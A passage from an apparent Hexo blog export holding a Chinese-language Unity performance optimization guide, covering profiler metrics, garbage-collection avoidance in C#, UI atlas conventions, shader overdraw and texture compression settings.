SerializedFile(3): WebStream:这个是由WWW来进行加载的内存占用. System.ExecutableAndDlls:不同平台和不同硬件得到的值会不一样。 \n\n#####[优化重点](https://blog.csdn.net/yangyy753/article/details/47025205)\n> A:CPU-GC Allow:1.检测任何一次性内存分配大于2KB的选项 2.检测每帧都具有20B以上内存分配的选项. \n> B:Time ms:记录游戏运行时每帧CPU占用（特别注意占用5ms以上的）. \n> C:Memory Profiler-Other:1.ManagedHeap.UsedSize: 移动游戏建议不要超过20MB. 2.SerializedFile: 通过异步加载(LoadFromCache、WWW等)的时候留下的序列化文件,可监视是否被卸载.  3.WebStream: 通过异步WWW下载的资源文件在内存中的解压版本,比SerializedFile大几倍或几十倍,重点监视.\n> D: Memory Profiler-Assets: 1.Texture2D: 重点检查是否有重复资源和超大Memory是否需要压缩等. 2.AnimationClip: 重点检查是否有重复资源.  3.Mesh： 重点检查是否有重复资源. \n> E:Device.Present: 1.GPU的presentdevice确实非常耗时，一般出现在使用了非常复杂的shader. \n2.GPU运行的非常快，而由于Vsync的原因，使得它需要等待较长的时间. \n3.同样是Vsync的原因，但其他线程非常耗时，所以导致该等待时间很长，比如：过量AssetBundle加载时容易出现该问题.4.Shader.CreateGPUProgram:Shader在runtime阶段（非预加载）会出现卡顿(华为K3V2芯片). \n> F:StackTraceUtility.PostprocessStacktrace()和StackTraceUtility.ExtractStackTrace():  1.一般是由Debug.Log或类似API造成. 2.游戏发布后需将Debug API进行屏蔽. \n> G:GC.Collect: 原因: 1.代码分配内存过量(恶性的) 2.一定时间间隔由系统调用(良性的). 占用时间：1.与现有Garbage size相关 2.与剩余内存使用颗粒相关（比如场景物件过多，利用率低的情况下，GC释放后需要做内存重排) \n> H:GarbageCollectAssetsProfile:1.引擎在执行UnloadUnusedAssets操作(该操作是比较耗时的,建议在切场景的时候进行). 2.尽可能地避免使用Unity内建GUI，避免GUI.Repaint过渡GC Allow. 3.if(other.tag == GearParent.MogoPlayerTag)改为other.CompareTag(GearParent.MogoPlayerTag).因为other.tag为产生180B的GC Allow.\n> I:少用foreach，因为每次foreach为产生一个enumerator(约16B的内存分配)，尽量改为for. Lambda表达式，使用不当会产生内存泄漏. 尽量少用LINQ:1.部分功能无法在某些平台使用. 2.会分配大量GC Allow.\n> J:控制StartCoroutine的次数：  1.开启一个Coroutine(协程)，至少分配37B的内存. 2.Coroutine类的实例 -- 21B.  3.Enumerator -- 16B.缓存组件: 1.每次GetComponent均会分配一定的GC Allow. 2.每次Object.name都会分配39B的堆内存.\n> K:1:许多贴图采用的Format格式是ARGB 32 bit所以保真度很高但占用的内存也很大。在不失真的前提下，适当压缩贴图，使用ARGB 16 bit就会减少一倍，如果继续Android采用RGBA Compressed ETC2 8 bits（iOS采用RGBA Compressed PVRTC 4 bits），又可以再减少一倍。把不需要透贴但有alpha通道的贴图，全都转换格式Android：RGB Compressed ETC 4 bits，iOS：RGB Compressed PVRTC 4 bits。2:当加载一个新的Prefab或贴图，不及时回收，它就会永驻在内存中，就算切换场景也不会销毁。应该确定物体不再使用或长时间不使用就先把物体制空(null)，然后调用Resources.UnloadUnusedAssets()，才能真正释放内存。3:有大量空白的图集贴图，可以用TexturePacker等工具进行优化或考虑合并到其他图集中。4:要保证每张图得像素宽高都是4得倍数,即除4余0.\n> L:AudioClip:播放时长较长的音乐文件需要进行压缩成.mp3或.ogg格式，时长较短的音效文件可以使用.wav 或.aiff格式。\n\n\n","slug":"Unity/Optimize/Unity优化总纲","published":1,"updated":"2020-06-16T08:09:39.280Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0700392gk77sby1k46","content":"<h1 id=\"编程代码规范\"><a href=\"#编程代码规范\" class=\"headerlink\" title=\"编程代码规范\"></a>编程代码规范</h1><ul>\n<li>1:脚本行数最多500行。</li>\n<li>2:如果要发行其他国家的版本需要重新Copy一份客户端代码,在另行修改</li>\n<li>3:c#扩展做链式语法非常容易,比如项目里面的WWWFormEx类的数据装载,非常好写.</li>\n<li>4:写好代码一定要多个平台测试</li>\n<li>5:编程代码规范不是一成不变的,需要根据人数,风格进行有效的变换</li>\n</ul>\n<h1 id=\"善用工具检测\"><a href=\"#善用工具检测\" class=\"headerlink\" title=\"善用工具检测\"></a>善用工具检测</h1><ul>\n<li>1:使用Unity自带的工具 <a href=\"https://unity3d.com/cn/learn/tutorials/temas/performance-optimization/diagnosing-performance-problems-using-profiler-window?playlist=44069\" target=\"_blank\" rel=\"noopener\">profile</a>,Frame Debug,Physics Debug,<a href=\"https://unity3d.com/cn/learn/tutorials/topics/scripting/data-types\" target=\"_blank\" rel=\"noopener\">数据类型</a>,<a href=\"https://unity3d.com/cn/learn/tutorials/topics/scripting/object-pooling\" target=\"_blank\" rel=\"noopener\">对象池</a>,<a href=\"https://learn.unity.com/tutorial/fixing-performance-problems#\" target=\"_blank\" rel=\"noopener\">官方视频</a>,</li>\n<li>2:使用 UPR</li>\n<li>3:使用 UWA</li>\n<li>4:使用 XCode 编辑器</li>\n<li>5:使用 Android studio 编辑器</li>\n<li>6:君子善用其器.一定要先了解一下这个工具再对其进行使用.</li>\n</ul>\n<h1 id=\"宏观性能关注点\"><a href=\"#宏观性能关注点\" class=\"headerlink\" title=\"宏观性能关注点\"></a>宏观性能关注点</h1><ul>\n<li>1:FPS 帧率需要大于 30 帧</li>\n<li>2:PSS 内存,越低越好,但需要根据渠道而定</li>\n<li>3:Mono峰值,小于 40M</li>\n<li>4:温度均值,越低越好</li>\n<li>5:能耗均值,电量,越低越好</li>\n<li>6:网络上传</li>\n<li>7:网络下载</li>\n</ul>\n<h1 id=\"微观性能关注点\"><a href=\"#微观性能关注点\" class=\"headerlink\" title=\"微观性能关注点\"></a>微观性能关注点</h1><table>\n<thead>\n<tr>\n<th>模块</th>\n<th>前期</th>\n<th>中期</th>\n<th>后期&amp;上线</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>渲染模块</td>\n<td>Draw Call,Triangle,vertex</td>\n<td>不透明,半透明,Culling</td>\n<td>图像后处理</td>\n</tr>\n<tr>\n<td>逻辑代码</td>\n<td>插件,第三方库调研,bug</td>\n<td>CPU,堆内存,调用次数</td>\n<td>bug</td>\n</tr>\n<tr>\n<td>UI 模块</td>\n<td>全屏,半屏,组织结构</td>\n<td>overdraw,重建 CPU</td>\n<td>Draw Call</td>\n</tr>\n<tr>\n<td>UGUI的API</td>\n<td>Canvas.BuildBatch,Canvas.SendWillRenderCanvases</td>\n<td>EventSystem.Update</td>\n<td>RenderSubBatch</td>\n</tr>\n<tr>\n<td>加载模块</td>\n<td>缓存池,序列化第三方库</td>\n<td>关注调用频率</td>\n<td>关注耗时</td>\n</tr>\n<tr>\n<td>加载模块的API</td>\n<td>Loading.UpdatePreloading,Resources.UnloadUnusedAssets</td>\n<td>GameObject.Instantiate</td>\n<td>GC.Collect</td>\n</tr>\n<tr>\n<td>资源使用</td>\n<td>分辨率,格式,顶点数,骨骼数</td>\n<td>数量,Mipmap,资源利用率,沉余</td>\n<td>调用次数</td>\n</tr>\n<tr>\n<td>内存占用</td>\n<td>资源,AB 包,Mono,Lua</td>\n<td>内存峰值,堆内存</td>\n<td>内存泄露</td>\n</tr>\n<tr>\n<td>粒子系统</td>\n<td>使用指标</td>\n<td>总体数量,active 数量</td>\n<td>Overdraw</td>\n</tr>\n<tr>\n<td>粒子系统的 API</td>\n<td>ParticleSystem.Update,ParticleSystem.SubmitVBO,ParticleSystem.Draw</td>\n<td>ParticleSystem.ScheduleGeometryJobs</td>\n<td></td>\n</tr>\n<tr>\n<td>动画系统</td>\n<td></td>\n<td>数量,AC 制作,CPU</td>\n<td></td>\n</tr>\n<tr>\n<td>动画系统的 API</td>\n<td>Animators.Update,Animation.Update</td>\n<td>MeshSkinning.Update</td>\n<td>Animator.Initialize</td>\n</tr>\n</tbody></table>\n<h1 id=\"官方数值建议\"><a href=\"#官方数值建议\" class=\"headerlink\" title=\"官方数值建议\"></a>官方数值建议</h1><table>\n<thead>\n<tr>\n<th>数值名称</th>\n<th>官方建议数值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ReservedMono峰值(MB)</td>\n<td>小于 80MB</td>\n</tr>\n<tr>\n<td>DrawCall峰值(次)</td>\n<td>小于 250 次</td>\n</tr>\n<tr>\n<td>平均帧率</td>\n<td>大于 25</td>\n</tr>\n<tr>\n<td>纹理资源峰值(MB)</td>\n<td>小于 50MB</td>\n</tr>\n<tr>\n<td>网格资源峰值(MB)</td>\n<td>小于 20MB</td>\n</tr>\n<tr>\n<td>动画资源峰值(MB)</td>\n<td>小于 15MB</td>\n</tr>\n<tr>\n<td>音频资源峰值(MB)</td>\n<td>小于 15MB</td>\n</tr>\n<tr>\n<td>Tris 峰值(面)</td>\n<td>小于 200000(20W 面)</td>\n</tr>\n</tbody></table>\n<h1 id=\"CPU-优化\"><a href=\"#CPU-优化\" class=\"headerlink\" title=\"CPU 优化\"></a>CPU 优化</h1><ul>\n<li>1:简单代码控制,避免CPU资源浪费</li>\n<li>2:避免使用闭包</li>\n<li>3:MonoBehaviour优化</li>\n<li>4:Component的优化</li>\n<li>5:GameObject的优化</li>\n</ul>\n<h1 id=\"GPU-优化\"><a href=\"#GPU-优化\" class=\"headerlink\" title=\"GPU 优化\"></a>GPU 优化</h1><h1 id=\"内存优化\"><a href=\"#内存优化\" class=\"headerlink\" title=\"内存优化\"></a>内存优化</h1><h1 id=\"UI-优化\"><a href=\"#UI-优化\" class=\"headerlink\" title=\"UI 优化\"></a>UI 优化</h1><ul>\n<li>1:NGUI 的优化</li>\n<li>2:UGUI 的优化</li>\n</ul>\n<h1 id=\"资源优化\"><a href=\"#资源优化\" class=\"headerlink\" title=\"资源优化\"></a>资源优化</h1><ul>\n<li>AssetBundle</li>\n<li>打包</li>\n</ul>\n<h1 id=\"渲染优化\"><a href=\"#渲染优化\" class=\"headerlink\" title=\"渲染优化\"></a>渲染优化</h1><ul>\n<li>shader</li>\n</ul>\n<h1 id=\"扩展阅读\"><a href=\"#扩展阅读\" class=\"headerlink\" title=\"扩展阅读\"></a>扩展阅读</h1><ul>\n<li>1:<a href=\"http://gad.qq.com/article/detail/28682\" target=\"_blank\" rel=\"noopener\">守望先锋:ECS架构</a>,<a href=\"https://docs.unity3d.com/Packages/com.unity.entities@0.1/manual/index.html\" target=\"_blank\" rel=\"noopener\">Unity官方文档</a>,<a href=\"http://blog.codingnow.com/2017/06/overwatch_ecs.html\" target=\"_blank\" rel=\"noopener\">云风</a>,<a href=\"http://t-machine.org/index.php/2007/09/03/entity-systems-are-the-future-of-mmog-development-part-1/\" target=\"_blank\" rel=\"noopener\">ECS博客</a>,<a href=\"https://www.youtube.com/watch?v=lNTaC-JWmdI\" target=\"_blank\" rel=\"noopener\">国外谈论</a>,<a href=\"https://github.com/sschmid/Entitas-CSharp\" target=\"_blank\" rel=\"noopener\">Entitas-CSharp</a>),<a href=\"https://github.com/egametang/ET\" target=\"_blank\" rel=\"noopener\">ET框架</a></li>\n<li>2:推荐想学习优化的同学一本书,&lt;&lt;Unity 游戏优化 2&gt;&gt;,作者是:克里斯*迪金森,翻译:蔡俊鸿,雷鸿飞.</li>\n</ul>\n<h1 id=\"代码控制\"><a href=\"#代码控制\" class=\"headerlink\" title=\"代码控制\"></a>代码控制</h1><ul>\n<li><p>1: 尽量不用foreach,全使用for,因为foreach产生GC</p>\n</li>\n<li><p>2: 字典替换成下面的写法</p>\n<pre><code>  var enumerator = m_Dictionary.GetEnumerator();\n  while (enumerator.MoveNext())\n  {\n      var element = enumerator.Current;\n      element.Value.UpdateComponent(deltaTime);\n  }</code></pre></li>\n<li><p>3: 字符串 + 号拼接不超过约10次,不会产生GC,如果超过10次,要使用StringBuilder进行拼接,不会产生GC</p>\n</li>\n<li><p>4: Struct 与 Class  如何装箱或拆箱少，堆内存少,Struct 在栈中不产生 GC，class 在堆中，会产生 GC。对 Struct 的结点修改时，修改完以后记得重新赋值。因为 Struct 赋值是 copy<br>而不是引用，修改完以后，以前的不生效。</p>\n</li>\n<li><p>5: 堆栈的空间有限，对于大量的逻辑的对象，创建类要比创建结构好一些。<br>结构表示轻量对象，并且结构的成本较低，适合处理大量短暂的对象。<br>在表现抽象和多级别的对象层次时，类是最好的选择。<br>大多数情况下该类型只是一些数据时，结构是最佳的选择。</p>\n</li>\n<li><p>6: 数组，ArrayList，List 的区别;</p>\n</li>\n</ul>\n<blockquote>\n<p>数组：内存中是连续存储的，索引速度非常快，赋值与修改元素也很简单。但不<br>利于动态扩展以及移动。<br>ArrayList: 因为数组的缺点，就产生了 ArrayList。ArrayList：使用该类时必须进行引用，同时继承了 IList 接口，提供了数据存储和检索，ArrayList 对象的大小动态伸缩，支持不同类型的结点。<br>ArrayList 虽然很完美，但结点类型是 Object，故不是类型安全的，也可能发生<br>装箱和拆箱操作，带来很大的性能耗损。对象是值类型的话会带来装箱拆箱操作<br>List 是泛型接口，规避了 ArrayList 的两个问题。利于动态扩展以及移动,但是搜索速度慢</p>\n</blockquote>\n<ul>\n<li>7: 不要把枚举当 TKey (字典的key)使用，不要把枚举转成 string 使用。</li>\n</ul>\n<h1 id=\"闭包\"><a href=\"#闭包\" class=\"headerlink\" title=\"闭包\"></a>闭包</h1><ul>\n<li>1:变量的作用域,成员变量作用于类、局部变量作用于函数、次局部变量作用于函数局部<br>片段。生命周期：变量随着其寄存对象生而生和消亡（不包括非实例化的 static 和 const<br>对象）。</li>\n<li>2:委托概念：是一个类型安全的对象，它指向程序中另一个以后会被调用的方法（或<br>多个方法）。通俗的说，委托是一个可以引用方法的对象，当创建一个委托，也<br>就创建一个引用方法的对象，进而就可以调用那个方法，即委托可以调用它所指<br>的方法。如何没有涉及到闭包的话，委托代码只生产一个函数而不是一个类。lamda表达式(闭包)</li>\n<li>3:    闭包概念：函数和与其相关的引用环境组合而成的实体。本质 1：代码块依然维护着它第一个被创建时环境（执行上下文）- 即它仍可以使用创建它的方法中局部变量，即使那个方法已经执行完了。(循环引用不释放);本质 2 Closures close over variables, not over values。闭包关闭的是变量，而不是值.闭包引用了外部变量就会生成一个新得类.函数调用频繁不使用闭包</li>\n</ul>\n<h1 id=\"MonoBehaviour-优化\"><a href=\"#MonoBehaviour-优化\" class=\"headerlink\" title=\"MonoBehaviour 优化\"></a>MonoBehaviour 优化</h1><ul>\n<li><p>1:如果没有相应的事件处理，删除对应的空函数</p>\n</li>\n<li><p>2:Update 优化 在 update 中尽量不要调用查找对象或组件方法如 FindByTag 或 Find 等等。可<br>以在 start 中先缓存下来，然后使用。 如果没必要每帧的逻辑，可以降低频率，方法如下：</p>\n<pre><code>  Void Update（）{if（Time.frameCount%6==0）{DoSomething();}}</code></pre></li>\n<li><p>3:如果没必要每帧的逻辑，可以使用周期性的协程,如果没必要每帧的逻辑，可以使用InvokeRepeating(“DoSomeThing”,0.5f,1.0f);</p>\n</li>\n<li><p>4:Gameobject 不可见时，设置 enabled = false 时，update 就会停止调用。</p>\n</li>\n<li><p>5:协程有优化:yield return null;每帧产生9个字节的GC垃圾,其余函数也会产生GC垃圾,需要使提前预生成方式</p>\n<pre><code>  WaitForSeconds wfs = new WaitForSeconds(0.1f);\n  IEnumerator AtlasTextureSetting()\n  {\n      yield return wfs;\n  }</code></pre></li>\n</ul>\n<h1 id=\"Component-优化\"><a href=\"#Component-优化\" class=\"headerlink\" title=\"Component 优化\"></a>Component 优化</h1><ul>\n<li>1:使用内建的数组，比如用 Vector3.zero 而不是 new Vector(0, 0, 0);</li>\n<li>2:transform.localRotation = Quaternion.Euler(Vector3.zero);transform.localScale =Vector3.one;transform.localPosition =Vector3.one;等</li>\n</ul>\n<h1 id=\"GameObject-相关优化\"><a href=\"#GameObject-相关优化\" class=\"headerlink\" title=\"GameObject 相关优化\"></a>GameObject 相关优化</h1><ul>\n<li>1:（脚本和本地引擎 C++代码之间的通信开销）Gameobject 缓存：类似组件的缓存策略。查找对象标签：if (go.CompareTag (“xxx”)来代替 if (go.tag == “xxx”)，因为内部循环调用对象分配的标签属性以及拷贝额外内存。SendMessageUpwards、SendMessage：少用这两个函数，使用委托替代。缓存组件：调用 GetComponent 函数耗性能，用变量先缓存到内存在使用, 有必要时记得更新缓存组件。</li>\n</ul>\n<h1 id=\"NGUI-相关优化\"><a href=\"#NGUI-相关优化\" class=\"headerlink\" title=\"NGUI 相关优化\"></a>NGUI 相关优化</h1><ul>\n<li>1: Canvas.BuildBatch()，<br>合批 Canvas 下所有网格，这个性能热点在 5.2 版本后挪到了子线程去做减轻了<br>主线程的压力，而 NGUI 作为一个插件没法做到这一点，网格合批的性能热点还<br>是耗在主线程的 UIPanel.LateUpdate()；</li>\n<li>2 : UGUI 的 UIMesh 生成是通过底层 C++代码实<br>现的，而 NGUI 只能通过上层的不断创建 Vertex List，这样在堆内存的管理上，<br>UGUI 确实要好很多，带来的隐形收益就是 GC 触发次数会少很多。</li>\n</ul>\n<h1 id=\"UI-资源规范（内存优化）\"><a href=\"#UI-资源规范（内存优化）\" class=\"headerlink\" title=\"UI 资源规范（内存优化）\"></a>UI 资源规范（内存优化）</h1><ul>\n<li>1:任何的 UI 图集最大 size 1024*1024（内存优化）；</li>\n<li>2:同一个界面出现的 UI 资源尽量放到一个图集，重复利用的公用资源放<br>common（DrawCall 优化）；</li>\n<li>3:能用九宫格的尽量用九宫格来减小原图大小（内存优化）；</li>\n<li>4.美术给过来的 UI 原图 size 尽量小，对于一些全屏的 loading 原画图，原画大<br>小是 1280 * 720，让美术按照比例高度缩小到 500，<br>这样一张 1024<em>1024 的图集就可以放两张原图了，提升图集利用率。对于一些<br>600</em>400 类似大小的原图，就尽量按比例把最长边压小到 500，这样出来的图<br>集就是 512 * 512 而不是 1024 * 1024（内存优化）；</li>\n<li>5.对于特别长条的 UI 原图，例如 1000<em>100，如果由于加入这个长条的原图导<br>致图集大小变大而且利用率很低的话，要把 1000</em>100 的原图拆分成两张图<br>500*100，在制作界面的时候用两个 Image 拼接即可，这样可以把 1024 的图<br>集缩小到 512（内存优化）；</li>\n<li>6.图集利用率低于 1/3 的时候，要考虑和其他同一个 size 的图集合并以提升利<br>用率。合并的原则是不改变任何一个图集的大小，这样即可完全省掉一张图集（内<br>存优化、安装包量优化）；</li>\n<li>7.尽量复用 UI 资源，减少不必要的原图，例如一个卡牌分了五种品质原画底图，<br>白蓝黄绿紫，就不要使用五张大底图了，让美术同事画一个灰色原图，Image 在<br>使用的时候直接按需求修改顶点色即可（内存优化）；</li>\n<li>8.关闭 mipmaps（内存优化）。</li>\n</ul>\n<h1 id=\"GPU-优化-1\"><a href=\"#GPU-优化-1\" class=\"headerlink\" title=\"GPU 优化\"></a>GPU 优化</h1><h4 id=\"Shader优化\"><a href=\"#Shader优化\" class=\"headerlink\" title=\"Shader优化\"></a>Shader优化</h4><ul>\n<li>1:Fog { Mode Off }，最早有一个版本我们没有关闭 Fog</li>\n<li>2:Fragment 剔除掉 Alpha 为 0 的像素点，减少 OverDraw；</li>\n<li>3:OverDraw 优化,在每帧绘制中，如果一个像素被反复绘制的次数越多，那么它占用的资源也必然<br>更多。目前在移动设备上，OverDraw 的压力主要来自半透明物体。因为多数情<br>况下，半透明物体需要开启 Alpha Blend 且关闭 ZWrite，同时如果我们绘制<br>像 alpha=0 这种实际上不会产生效果的颜色上去，也同样有 Blend 操作，这是<br>一种极大的浪费。我们的 UI 绘制是 Alpha Blend 且关闭 ZWrite，因此 UI OverDraw 的优化主要<br>是在制作界面的时候减少 UI 重叠层级（和策划、美术 pk）。除此之外还是有一<br>些我们程序可以控制的优化点：1.对于九宫格的 Image，如果去掉 fillcenter 不影响最后出来的效果就要把<br>fillcenter 去掉，可以减少中间一片的像素绘制；2.看不见的元素且没有逻辑功能要 disable 或者挪出裁剪区域，而不要通过设置Alpha=0 来隐藏；3.不要使用一张 Alpha=0 的 Image 来实现放大响应区域的功能；4.UI 底层系统来控制隐藏看不见的元素，例如打开全屏 UI 的时候把下面看不见的 UI 挪出裁减区域、关闭主相机渲染。</li>\n</ul>\n<h4 id=\"CPU优化\"><a href=\"#CPU优化\" class=\"headerlink\" title=\"CPU优化\"></a>CPU优化</h4><ul>\n<li>1:优化DrawCall、Canvas.SendWillRenderCanvases()、Canvas.BuildBatch()</li>\n<li>2:DrawCall,DrawCall 是 CPU 调用底层图形接口，频繁的调用对 CPU 性能的影响是很明显<br>的。优化思路很简单，合批绘制。UGUI 本身的动态合批机制会帮我们尽量的去<br>优化合批，我们要做的就是弄清楚它的合批机制然后让 UI 元素尽量合批绘制。合理分配图集，同一个界面上的图尽量打到一个图集，多个界面复用的图，放到 common；</li>\n<li>3:制作界面的时候，相邻节点尽量使用同一个图集的图片；</li>\n<li>4:Text 本身也是用的 Font Texture，不同字体的 Text 也是来自不同的图集，所<br>以在布局界面的时候也要尽量避免穿插打断绘制流程；</li>\n<li>5:DrawCall 的数量不是完全由 Hierarchy 的布局决定，和 UI 的位置也有关系，<br>这个位置不是指的 Rectranform 上面的 size 位置重叠就一定打断绘制，而是真<br>实的三角面的位置是否重叠。这个可以在 Scene 视图下用线框模式(Texture<br>Wire)去观察；</li>\n<li>6:.少用 Mask 组件，Mask 实现的原理是 Stencil Buffer，往模版缓存里绘制，<br>模版缓存里的东西才是可见的。模板缓存会打断所有的合批，Mask 的子节点和<br>外面的节点无法合批，模板缓存自己占一个 DrawCall。Unity5.2 之后的版本建<br>议使用 2D Rect Mask 替代。</li>\n</ul>\n<h1 id=\"Profiler介绍及优化\"><a href=\"#Profiler介绍及优化\" class=\"headerlink\" title=\"Profiler介绍及优化\"></a>Profiler介绍及优化</h1><ul>\n<li>1: WaitForTargetFPS: Vsync(垂直同步)功能，即显示当前帧的CPU等待时间</li>\n<li>2: Camera.Render: 相机渲染准备工作的CPU占用量 </li>\n<li>3: Shader.Parse: 资源加入后引擎对Shader的解析过程</li>\n<li>4: Reserved Total:系统在当前帧的申请内存</li>\n<li>5: GameObjects in Scene:当前帧场景中的GameObject数量</li>\n<li>6: Total Objects in Scene:当前帧场景中的Object数量(除GameObject外，还有Component等). </li>\n<li>7: Total Object Count: Object数据 + Asset数量. </li>\n<li>8: Assets: Texture2d:记录当前帧内存中所使用的纹理资源情况，包括各种GameObject的纹理、天空盒纹理以及场景中所用的Lightmap资源.</li>\n<li>9: Scene Memory:记录当前场景中各个方面的内存占用情况，包括GameObject、所用资源、各种组件以及GameManager等（天般情况通过AssetBundle加载的不会显示在这里). </li>\n<li>10: Other:ManagedHeap.UseSize:代码在运行时造成的堆内存分配，表示上次GC到目前为止所分配的堆内存量. SerializedFile(3): WebStream:这个是由WWW来进行加载的内存占用. System.ExecutableAndDlls:不同平台和不同硬件得到的值会不一样。 </li>\n</ul>\n<p>#####<a href=\"https://blog.csdn.net/yangyy753/article/details/47025205\" target=\"_blank\" rel=\"noopener\">优化重点</a></p>\n<blockquote>\n<p>A:CPU-GC Allow:1.检测任何一次性内存分配大于2KB的选项 2.检测每帧都具有20B以上内存分配的选项.<br>B:Time ms:记录游戏运行时每帧CPU占用（特别注意占用5ms以上的）.<br>C:Memory Profiler-Other:1.ManagedHeap.UsedSize: 移动游戏建议不要超过20MB. 2.SerializedFile: 通过异步加载(LoadFromCache、WWW等)的时候留下的序列化文件,可监视是否被卸载.  3.WebStream: 通过异步WWW下载的资源文件在内存中的解压版本,比SerializedFile大几倍或几十倍,重点监视.<br>D: Memory Profiler-Assets: 1.Texture2D: 重点检查是否有重复资源和超大Memory是否需要压缩等. 2.AnimationClip: 重点检查是否有重复资源.  3.Mesh： 重点检查是否有重复资源.<br>E:Device.Present: 1.GPU的presentdevice确实非常耗时，一般出现在使用了非常复杂的shader.<br>2.GPU运行的非常快，而由于Vsync的原因，使得它需要等待较长的时间.<br>3.同样是Vsync的原因，但其他线程非常耗时，所以导致该等待时间很长，比如：过量AssetBundle加载时容易出现该问题.4.Shader.CreateGPUProgram:Shader在runtime阶段（非预加载）会出现卡顿(华为K3V2芯片).<br>F:StackTraceUtility.PostprocessStacktrace()和StackTraceUtility.ExtractStackTrace():  1.一般是由Debug.Log或类似API造成. 2.游戏发布后需将Debug API进行屏蔽.<br>G:GC.Collect: 原因: 1.代码分配内存过量(恶性的) 2.一定时间间隔由系统调用(良性的). 占用时间：1.与现有Garbage size相关 2.与剩余内存使用颗粒相关（比如场景物件过多，利用率低的情况下，GC释放后需要做内存重排)<br>H:GarbageCollectAssetsProfile:1.引擎在执行UnloadUnusedAssets操作(该操作是比较耗时的,建议在切场景的时候进行). 2.尽可能地避免使用Unity内建GUI，避免GUI.Repaint过渡GC Allow. 3.if(other.tag == GearParent.MogoPlayerTag)改为other.CompareTag(GearParent.MogoPlayerTag).因为other.tag为产生180B的GC Allow.<br>I:少用foreach，因为每次foreach为产生一个enumerator(约16B的内存分配)，尽量改为for. Lambda表达式，使用不当会产生内存泄漏. 尽量少用LINQ:1.部分功能无法在某些平台使用. 2.会分配大量GC Allow.<br>J:控制StartCoroutine的次数：  1.开启一个Coroutine(协程)，至少分配37B的内存. 2.Coroutine类的实例 – 21B.  3.Enumerator – 16B.缓存组件: 1.每次GetComponent均会分配一定的GC Allow. 2.每次Object.name都会分配39B的堆内存.<br>K:1:许多贴图采用的Format格式是ARGB 32 bit所以保真度很高但占用的内存也很大。在不失真的前提下，适当压缩贴图，使用ARGB 16 bit就会减少一倍，如果继续Android采用RGBA Compressed ETC2 8 bits（iOS采用RGBA Compressed PVRTC 4 bits），又可以再减少一倍。把不需要透贴但有alpha通道的贴图，全都转换格式Android：RGB Compressed ETC 4 bits，iOS：RGB Compressed PVRTC 4 bits。2:当加载一个新的Prefab或贴图，不及时回收，它就会永驻在内存中，就算切换场景也不会销毁。应该确定物体不再使用或长时间不使用就先把物体制空(null)，然后调用Resources.UnloadUnusedAssets()，才能真正释放内存。3:有大量空白的图集贴图，可以用TexturePacker等工具进行优化或考虑合并到其他图集中。4:要保证每张图得像素宽高都是4得倍数,即除4余0.<br>L:AudioClip:播放时长较长的音乐文件需要进行压缩成.mp3或.ogg格式，时长较短的音效文件可以使用.wav 或.aiff格式。</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"编程代码规范\"><a href=\"#编程代码规范\" class=\"headerlink\" title=\"编程代码规范\"></a>编程代码规范</h1><ul>\n<li>1:脚本行数最多500行。</li>\n<li>2:如果要发行其他国家的版本需要重新Copy一份客户端代码,在另行修改</li>\n<li>3:c#扩展做链式语法非常容易,比如项目里面的WWWFormEx类的数据装载,非常好写.</li>\n<li>4:写好代码一定要多个平台测试</li>\n<li>5:编程代码规范不是一成不变的,需要根据人数,风格进行有效的变换</li>\n</ul>\n<h1 id=\"善用工具检测\"><a href=\"#善用工具检测\" class=\"headerlink\" title=\"善用工具检测\"></a>善用工具检测</h1><ul>\n<li>1:使用Unity自带的工具 <a href=\"https://unity3d.com/cn/learn/tutorials/temas/performance-optimization/diagnosing-performance-problems-using-profiler-window?playlist=44069\" target=\"_blank\" rel=\"noopener\">profile</a>,Frame Debug,Physics Debug,<a href=\"https://unity3d.com/cn/learn/tutorials/topics/scripting/data-types\" target=\"_blank\" rel=\"noopener\">数据类型</a>,<a href=\"https://unity3d.com/cn/learn/tutorials/topics/scripting/object-pooling\" target=\"_blank\" rel=\"noopener\">对象池</a>,<a href=\"https://learn.unity.com/tutorial/fixing-performance-problems#\" target=\"_blank\" rel=\"noopener\">官方视频</a>,</li>\n<li>2:使用 UPR</li>\n<li>3:使用 UWA</li>\n<li>4:使用 XCode 编辑器</li>\n<li>5:使用 Android studio 编辑器</li>\n<li>6:君子善用其器.一定要先了解一下这个工具再对其进行使用.</li>\n</ul>\n<h1 id=\"宏观性能关注点\"><a href=\"#宏观性能关注点\" class=\"headerlink\" title=\"宏观性能关注点\"></a>宏观性能关注点</h1><ul>\n<li>1:FPS 帧率需要大于 30 帧</li>\n<li>2:PSS 内存,越低越好,但需要根据渠道而定</li>\n<li>3:Mono峰值,小于 40M</li>\n<li>4:温度均值,越低越好</li>\n<li>5:能耗均值,电量,越低越好</li>\n<li>6:网络上传</li>\n<li>7:网络下载</li>\n</ul>\n<h1 id=\"微观性能关注点\"><a href=\"#微观性能关注点\" class=\"headerlink\" title=\"微观性能关注点\"></a>微观性能关注点</h1><table>\n<thead>\n<tr>\n<th>模块</th>\n<th>前期</th>\n<th>中期</th>\n<th>后期&amp;上线</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>渲染模块</td>\n<td>Draw Call,Triangle,vertex</td>\n<td>不透明,半透明,Culling</td>\n<td>图像后处理</td>\n</tr>\n<tr>\n<td>逻辑代码</td>\n<td>插件,第三方库调研,bug</td>\n<td>CPU,堆内存,调用次数</td>\n<td>bug</td>\n</tr>\n<tr>\n<td>UI 模块</td>\n<td>全屏,半屏,组织结构</td>\n<td>overdraw,重建 CPU</td>\n<td>Draw Call</td>\n</tr>\n<tr>\n<td>UGUI的API</td>\n<td>Canvas.BuildBatch,Canvas.SendWillRenderCanvases</td>\n<td>EventSystem.Update</td>\n<td>RenderSubBatch</td>\n</tr>\n<tr>\n<td>加载模块</td>\n<td>缓存池,序列化第三方库</td>\n<td>关注调用频率</td>\n<td>关注耗时</td>\n</tr>\n<tr>\n<td>加载模块的API</td>\n<td>Loading.UpdatePreloading,Resources.UnloadUnusedAssets</td>\n<td>GameObject.Instantiate</td>\n<td>GC.Collect</td>\n</tr>\n<tr>\n<td>资源使用</td>\n<td>分辨率,格式,顶点数,骨骼数</td>\n<td>数量,Mipmap,资源利用率,沉余</td>\n<td>调用次数</td>\n</tr>\n<tr>\n<td>内存占用</td>\n<td>资源,AB 